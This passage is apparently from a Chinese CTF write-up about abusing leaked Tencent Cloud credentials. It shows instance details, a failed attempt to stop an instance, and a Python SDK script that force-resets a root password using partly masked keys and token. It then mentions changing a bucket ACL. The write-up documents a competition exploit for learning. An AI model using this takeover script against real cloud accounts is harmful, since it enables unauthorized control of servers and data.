            &#34;HpcClusterId&#34;: &#34;&#34;,
            &#34;RdmaIpAddresses&#34;: null,
            &#34;DedicatedClusterId&#34;: &#34;&#34;,
            &#34;IsolatedSource&#34;: &#34;NOTISOLATED&#34;,
            &#34;GPUInfo&#34;: null,
            &#34;LicenseType&#34;: &#34;TencentCloud&#34;,
            &#34;DisableApiTermination&#34;: false,
            &#34;DefaultLoginUser&#34;: &#34;root&#34;,
            &#34;DefaultLoginPort&#34;: 22,
            &#34;LatestOperationErrorMsg&#34;: null,
            &#34;PublicIPv6Addresses&#34;: null
        }
    ],
    &#34;RequestId&#34;: &#34;0d773374-122d-4d26-aa78-8c53de72923f&#34;
}
```

第一台机子的 ip 刚好是满足条件的，注意到其相关配置

```
&#34;LoginSettings&#34;: {
    &#34;Password&#34;: null,
    &#34;KeyIds&#34;: null,
}
......
&#34;DefaultLoginUser&#34;: &#34;root&#34;
```

说明这台机子是没有设密码且登录名是 root，这里注意目标实例在创建时没有设置密码且没有绑定 SSH 密钥，我们这里可以把密码重置

```
┌──(root㉿lll)-[~]
└─# tccli cvm StopInstances --InstanceIds &#39;[&#34;ins-hc0ktysk&#34;]&#39;
usage: tccli [options] &lt;command&gt; &lt;subcommand&gt; [&lt;subcommand&gt; ...] [parameters]
To tccli help text, you can run:

  tccli help
  tccli configure help
  tccli service[cvm] help
  tccli service[cvm] action[RunInstances] help

[TencentCloudSDKException] code:UnauthorizedOperation message:[request id:7bdd8c92-ab41-4e10-80e5-6b928a207420]you are not authorized to perform operation (cvm:StopInstances)
resource (qcs:id/0:cvm:ap-guangzhou:uin/100026992078:instance/ins-hc0ktysk) has no permission
 requestId:7bdd8c92-ab41-4e10-80e5-6b928a207420
```

必须停止才能重置密码，但是这没权限停止，到这其实就不知道咋办了，后续看了狼组的 wp ，发现可以用腾讯云的 python sdk 来强制修改密码的。参考：https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247511178&amp;idx=1&amp;sn=8d4d1ba961a2aee497a712ce2a82ff4c&amp;chksm=e934b59ca1ccc328c9f64b2ece0b1fa719efb5f2e0f0561c06e7df3fc3922cca7e27ead9d73d&amp;mpshare=1&amp;scene=23&amp;srcid=0919iN7MiVZCa0PkTOwoXQMP&amp;sharer_shareinfo=1b3be1b1bf770ffeae88c43a168d98b6&amp;sharer_shareinfo_first=1b3be1b1bf770ffeae88c43a168d98b6#rd

```
# -*- coding: utf-8 -*-
import os
import json

from tencentcloud.common.common_client import CommonClient
from tencentcloud.common import credential
from tencentcloud.common.exception.tencent_cloud_sdk_exception import TencentCloudSDKException
from tencentcloud.common.profile.client_profile import ClientProfile
from tencentcloud.common.profile.http_profile import HttpProfile

try:
    cred = credential.Credential(&#34;AKIDzW8kWxxxxazBCFZun0u_uooqap&#34;, &#34;CzClytxxxxx=&#34;, &#34;cIVuxxxxxxxxxxxxxEt7a52ESm8Rwgs3mHoHbJuuCH7DcBReqEEU_JgVHDUlLj1T68t_WRN20xcWb37sl7iRAFUgAseZ0HuRezPk2QNIq1F1mHh-xqh94NTWr15QF-L4HPu-h_GJGGexQGED7hvnQ59np2jiCsgMv5-_QAwJgMgrXQ44ztP2ZgUOqYYgao4eo5ABTKFMjdGXHK7mzHEfv5hqVnV5BNcR3aayAHqFgFW8pTNC71EVUx_cdukepaH0x_xNEb4XkvHKteVjWVXCI8BE8Jl5Qyr1HNO9x5vZx50yYXO0ZlxRXCPnPdtL9mvwK_hj2iU4TE_X4nwsQsdPdU_t-XdarmveUY77RPjrBD9giapUaXYuMrsjf1oILTM2MraAOmm6xk6PKumEUMiFcYpML0buizj6i-7LeyO5e5FgGuvygTDBcFS95jEyXdpfT2LS1I1CO0uvVm8I4ZG-ce3rzFY1oL6x11UO4vxBRTeDPl-KatdARcLK65SPLdr_4hmiULHDl4rMjrGv35TRdBJ0NvqamVwXo4GhHdl2yC7nP-dFfrQabusakzROhXpFNZMAAEeMOpw96gRDk8mXPqhhW_sYQAdcVqA&#34;)
    httpProfile = HttpProfile()
    httpProfile.endpoint = &#34;cvm.tencentcloudapi.com&#34;
    clientProfile = ClientProfile()
    clientProfile.httpProfile = httpProfile

    params = &#34;{\&#34;InstanceIds\&#34;:[\&#34;ins-8xxxxx\&#34;],\&#34;Password\&#34;:\&#34;Aa112211.\&#34;,\&#34;UserName\&#34;:\&#34;root\&#34;,\&#34;ForceStop\&#34;:true}&#34;
    common_client = CommonClient(&#34;cvm&#34;, &#34;2017-03-12&#34;, cred, &#34;ap-guangzhou&#34;, profile=clientProfile)
    print(common_client.call_json(&#34;ResetInstancesPassword&#34;, json.loads(params)))
except TencentCloudSDKException as err:
    print(err)
```

最后 putbucketacl 修改下 acl 策略即可（没环境了，就不演示了，应该就是正常 put 个 acl 策略就好了）


---

> 作者: 6s6  
> URL: http://localhost:1313/posts/cebf4ad/  

